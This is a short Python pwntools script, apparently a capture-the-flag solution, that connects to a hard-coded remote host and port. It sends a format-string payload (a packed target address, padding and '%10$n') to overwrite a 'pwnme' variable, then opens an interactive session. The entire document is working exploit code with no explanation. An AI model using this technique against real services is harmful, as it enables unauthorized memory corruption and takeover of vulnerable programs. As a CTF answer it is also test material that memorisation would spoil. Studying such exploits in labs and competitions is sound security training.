from pwn import *

r = remote('111.198.29.45', 46635)


pwnme_addr = 0x0804A068                       
payload = p32(pwnme_addr) + 'aaaa' + '%10$n'


r.recvuntil("please tell me your name:\n")
r.sendline('BurYiA')

r.recvuntil("leave your message please:\n")
r.sendline(payload)

r.interactive()
